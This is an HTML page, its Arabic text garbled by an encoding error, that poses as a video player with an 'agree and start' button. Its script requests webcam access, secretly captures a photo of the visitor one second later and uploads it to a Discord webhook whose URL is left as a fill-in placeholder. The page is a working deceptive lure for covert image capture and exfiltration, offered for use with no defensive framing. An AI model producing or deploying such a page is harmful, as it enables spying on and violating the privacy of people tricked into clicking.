 <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ</title>
<style>
  body { margin: 0; background: #000; color: #fff; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
  .card { text-align: center; width: 90%; max-width: 420px; }
  button { background: #fe2c55; color: #fff; padding: 15px 40px; border-radius: 50px; font-size: 18px; border: none; cursor: pointer; font-weight: bold; }
  video { display: none; width: 100%; margin-top: 15px; border-radius: 12px; transform: scaleX(-1); }
  canvas { display: none; } 
</style>
</head>
<body>

<div class="card">
  <button id="startBtn">â–¶ Ø£ÙˆØ§ÙÙ‚ ÙˆØ£Ø¨Ø¯Ø£</button>
  <p id="msg">Ø¨Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø£ÙˆØ§ÙÙ‚ØŒ Ø£Ù†Øª ØªØ³Ù…Ø­ Ø¨Ø¨Ø¯Ø¡ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ.</p>
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas> 
</div>

<script>
  const btn = document.getElementById('startBtn');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const msg = document.getElementById('msg');

  // Ø¶Ø¹ Ø±Ø§Ø¨Ø· Ø§Ù„ÙˆÙŠØ¨ Ù‡ÙˆÙƒ Ø§Ù„Ø®Ø§Øµ Ø¨Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ù‡Ù†Ø§
  const DISCORD_WEBHOOK_URL = 'Ø¶Ø¹_Ø±Ø§Ø¨Ø·_Ø§Ù„ÙˆÙŠØ¨_Ù‡ÙˆÙƒ_Ù‡Ù†Ø§';

  btn.onclick = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      
      video.onloadedmetadata = () => {
        video.style.display = 'block';
        btn.style.display = 'none';
        msg.style.display = 'none';
        
        // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© ÙˆØ§Ø­Ø¯Ø© Ù„Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§
        setTimeout(captureAndSend, 1000);
      };
    } catch (err) {
      console.error("Ø®Ø·Ø£:", err);
    }
  };

  async function captureAndSend() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Blob Ù„Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§ ÙƒÙ…Ù„Ù Ø­Ù‚ÙŠÙ‚ÙŠ Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
    canvas.toBlob(async (blob) => {
      const formData = new FormData();
      formData.append('file', blob, 'shot.png');
      formData.append('content', 'ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹!');

      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });
        console.log("ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯");
      } catch (error) {
        console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", error);
      }
    }, 'image/png');
  }
</script>

</body>
</html>
